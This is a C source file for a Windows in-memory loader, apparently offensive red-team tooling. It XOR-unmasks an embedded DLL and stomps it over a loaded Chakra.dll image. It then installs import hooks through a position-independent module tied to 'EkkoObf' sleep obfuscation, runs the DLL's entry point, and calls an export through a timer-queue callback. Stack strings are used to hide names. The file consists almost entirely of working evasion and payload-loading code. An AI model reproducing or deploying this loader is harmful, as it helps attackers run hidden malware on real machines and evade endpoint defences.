#include <windows.h>
#include "loader.h"
#include "tcg.h"

#define NtCurrentProcess()  ((HANDLE)(LONG_PTR)-1)

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc ( LPVOID, SIZE_T, DWORD, DWORD );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect ( LPVOID, SIZE_T, DWORD, PDWORD );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree ( LPVOID, SIZE_T, DWORD );
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FlushInstructionCache(HANDLE, LPCVOID, SIZE_T);
// MessageBoxA is used in the hooks to demonstrate that the hooks are working, and to show the output of the GetVersions callback
DECLSPEC_IMPORT int WINAPI USER32$MessageBoxA ( HWND, LPCSTR, LPCSTR, UINT );
DECLSPEC_IMPORT HANDLE  KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL    KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  KERNEL32$CreateTimerQueue(VOID);
DECLSPEC_IMPORT BOOL    KERNEL32$CreateTimerQueueTimer(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
DECLSPEC_IMPORT BOOL    KERNEL32$DeleteTimerQueue(HANDLE);
DECLSPEC_IMPORT HANDLE  KERNEL32$CreateEventA(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
DECLSPEC_IMPORT BOOL    KERNEL32$SetEvent(HANDLE);
// GetLastError from kernel32.dll for error handling
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError ( void );
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR, HANDLE, DWORD);

// Printf from msvcrt.dll
DECLSPEC_IMPORT int __cdecl MSVCRT$printf ( const char *, ... );
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset ( void *, int, size_t );


char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );

char _PICO_ [ 0 ] __attribute__ ( ( section ( "pico" ) ) );

char _MASK_  [0] __attribute__ ( ( section ( "mask"  ) ) );

typedef struct {
    char data [ 4096 ];
    char code [ 16384 ];
} PICO;

typedef struct {
    int  len;
    char value[];
} RESOURCE;

typedef struct {
	char * picData;
	DWORD  picSize;
} PIC_CLEANUP_CTX;
typedef struct {
    void (*fn)(void);
    HANDLE evt;
} TIMER_CTX;

int __tag_setup_hooks ( );
int __tag_set_image_info ( );

typedef void ( * SETUP_HOOKS ) ( IMPORTFUNCS * funcs );
typedef void ( * SET_IMAGE_INFO ) ( PVOID base, DWORD size );

#define GETRESOURCE(x) ( char * ) &x


void fix_section_permissions ( DLLDATA * dll, char * dst )
{
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr  = ( IMAGE_SECTION_HEADER * ) PTR_OFFSET ( dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader );

    for ( int i = 0; i < section_count; i++ )
    {
        section_dst  = dst + section_hdr->VirtualAddress;

        /* use VirtualSize (actual in-memory size); fall back to SizeOfRawData */
        section_size = section_hdr->Misc.VirtualSize;
        if ( section_size == 0 )
            section_size = section_hdr->SizeOfRawData;

        /* reset protection each iteration */
        new_protect = 0;

        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) {
            new_protect = PAGE_READONLY;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_READWRITE;
        }
        if ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            new_protect = PAGE_EXECUTE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) ) {
            new_protect = PAGE_EXECUTE_READWRITE;
        }
        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
            new_protect = PAGE_EXECUTE_READ;
        }
        // if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
        //     new_protect = PAGE_EXECUTE_READWRITE;
        // }

        /* only call VirtualProtect if we have a valid protection and size */
        if ( new_protect != 0 && section_size > 0 ) {
            BOOL ok = KERNEL32$VirtualProtect ( section_dst, section_size, new_protect, &old_protect );
            MSVCRT$printf ( "[fix_perm] section %d: addr=%p size=0x%lx prot=0x%lx -> ok=%d err=%lu\n",
                            i, section_dst, section_size, new_protect, ok, ok ? 0 : KERNEL32$GetLastError() );
        } else {
            MSVCRT$printf ( "[fix_perm] section %d: SKIPPED (prot=0x%lx size=0x%lx)\n", i, new_protect, section_size );
        }

        /* advance to section */
        section_hdr++;
    }
}

/* Top-level timer callback used to invoke function pointers and signal an event. */
VOID CALLBACK Loader_TimerInvoke(PVOID lpParam, BOOLEAN TimerOrWaitFired)
{
    typedef struct { void (*fn)(void); HANDLE evt; } TIMER_CTX;
    TIMER_CTX *ctx = (TIMER_CTX *)lpParam;
    if (!ctx) return;

    if (ctx->fn) ctx->fn();
    if (ctx->evt) KERNEL32$SetEvent(ctx->evt);

    /* free our context */
    KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
}

void go(void)
{
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

	/* get the pico */
    char * pico_src = GETRESOURCE ( _PICO_ );

	/* allocate memory for it */
    PICO * pico_dst = ( PICO * ) KERNEL32$VirtualAlloc ( NULL, sizeof ( PICO ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* load it into memory */
    PicoLoad ( &funcs, pico_src, pico_dst->code, pico_dst->data );

    /* make code section RX */
    DWORD old_protect;
    KERNEL32$VirtualProtect ( pico_dst->code, PicoCodeSize ( pico_src ), PAGE_EXECUTE_READ, &old_protect );

    /* call setup_hooks to overwrite funcs.GetProcAddress */
    ( ( SETUP_HOOKS ) PicoGetExport ( pico_src, pico_dst->code, __tag_setup_hooks ( ) ) ) ( &funcs );

    RESOURCE * masked_dll = ( RESOURCE * ) GETRESOURCE ( _DLL_ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( _MASK_ );
                                                     
    /* now we can load the DLL */
    /* allocate some temporary memory */
    char * dll_src = KERNEL32$VirtualAlloc ( NULL, masked_dll->len, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

    /* unmask and copy it into memory */
    for ( int i = 0; i < masked_dll->len; i++ ) {
        dll_src [ i ] = masked_dll->value [ i ] ^ mask_key->value [ i % mask_key->len ];
    }

    DLLDATA dll_data;
    ParseDLL(dll_src, &dll_data);

    /* Try to map the real Chakra.dll and overwrite its image (stomp).
     * If that fails, fall back to allocating private memory and copy. */
    char* dll_dst = (char*)KERNEL32$LoadLibraryExA( "Chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES );
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_dst;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll_dst + dos->e_lfanew);
    DWORD dll_size = nt->OptionalHeader.SizeOfImage;
    KERNEL32$VirtualProtect( dll_dst, dll_size, PAGE_READWRITE, &old_protect );
    MSVCRT$memset(dll_dst, 0, dll_size);
    
    LoadDLL(&dll_data, dll_src, dll_dst);
    
	ProcessImports(&funcs, &dll_data, dll_dst);

    /* wipe and free the unmasked DLL copy — only dll_dst is needed from here */
    volatile char * p = ( volatile char * ) dll_src;
    for ( int z = 0; z < masked_dll->len; z++ )
        p [ z ] = 0;
    KERNEL32$VirtualFree ( dll_src, 0, MEM_RELEASE );

    /* re-parse from the mapped image since dll_src is gone */
    ParseDLL ( dll_dst, &dll_data );

    /* tell the PICO (EkkoObf) which region is the DLL image */
    ( ( SET_IMAGE_INFO ) PicoGetExport ( pico_src, pico_dst->code, __tag_set_image_info ( ) ) ) ( dll_dst, SizeOfDLL(&dll_data) );

    MSVCRT$printf ( "[loader] fixing section permissions...\n" );
    fix_section_permissions(&dll_data, dll_dst);

    /* protect the PE header page as read-only */
    DWORD hdr_old_protect = 0;
    KERNEL32$VirtualProtect ( dll_dst, dll_data.NtHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &hdr_old_protect );

	KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));

    MSVCRT$printf ( "[loader] calling entry point...\n" );
    DLLMAIN_FUNC entry_point = EntryPoint(&dll_data, dll_dst);
    entry_point((HINSTANCE)dll_dst, DLL_PROCESS_ATTACH, NULL);

    MSVCRT$printf ( "[loader] entry point returned, checking permissions again...\n" );
    /* re-apply section permissions in case the DLL's DllMain undid them */
    fix_section_permissions(&dll_data, dll_dst);
    KERNEL32$FlushInstructionCache((HANDLE)-1, dll_dst, SizeOfDLL(&dll_data));

    typedef void (WINAPI * _GetVersions)();
	/* * THE TRICK: Stack Strings
     * We declare the string as a char array. This forces the compiler 
     * to build the string byte-by-byte on the stack at runtime.
     * This avoids the "Relocation" error completely.
     */
	char targetFunc[] = { 'G','e','t','V','e','r','s','i','o','n','s', 0 };
    _GetVersions pGetVersions = (_GetVersions)GetExport(dll_dst, targetFunc);

    if (pGetVersions)
    {
        MSVCRT$printf ( "[loader] invoking GetVersions() via CreateTimerQueueTimer...\n" );

        HANDLE hTimerQueue = KERNEL32$CreateTimerQueue();
        HANDLE hTimer = NULL;
        HANDLE hEvt = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);

        TIMER_CTX * ctx = (TIMER_CTX *)KERNEL32$VirtualAlloc(NULL, sizeof(TIMER_CTX), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (ctx && hTimerQueue && hEvt) {
            ctx->fn = pGetVersions;
            ctx->evt = hEvt;

            /* Create a timer that will call our loader timer invoke. */
            if (KERNEL32$CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)Loader_TimerInvoke, ctx, 0, 0, WT_EXECUTEONLYONCE)) {
                MSVCRT$printf("[loader] waiting for timer to invoke GetVersions()...\n");
                KERNEL32$WaitForSingleObject(hEvt, 500);
                MSVCRT$printf("[loader] timer invocation finished\n");
            } else {
                MSVCRT$printf("[loader] CreateTimerQueueTimer failed\n");
                KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
            }

            KERNEL32$DeleteTimerQueue(hTimerQueue);
            KERNEL32$CloseHandle(hEvt);
        } else {
            MSVCRT$printf("[loader] failed to create timer queue/event or allocate ctx\n");
            if (ctx) KERNEL32$VirtualFree(ctx, 0, MEM_RELEASE);
            if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);
            if (hEvt) KERNEL32$CloseHandle(hEvt);
        }

    }
}